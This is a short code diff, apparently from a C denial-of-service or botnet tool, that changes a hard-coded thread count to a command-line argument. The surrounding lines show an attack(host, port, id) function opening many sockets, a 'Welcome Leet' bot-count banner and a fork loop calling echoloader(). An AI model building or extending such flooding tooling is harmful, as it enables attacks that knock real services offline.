@@ -76,7 +76,6 @@ void broke(int s) {
 }
 
 #define CONNECTIONS 10
-#define THREADS 100
 
 void attack(char *host, char *port, int id) {
 	int sockets[CONNECTIONS];
@@ -131,6 +130,7 @@ int main(int argc, char **argv) {
 		sprintf(banner_bot_count, 	"\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome Leet\x1b[36m --------\x1b[37m#\r\n");
 
 	}
+	int THREADS = atoi(argv[3]);
 	for(x=0; x != THREADS; x++) {
 		if(fork())
 			echoloader();
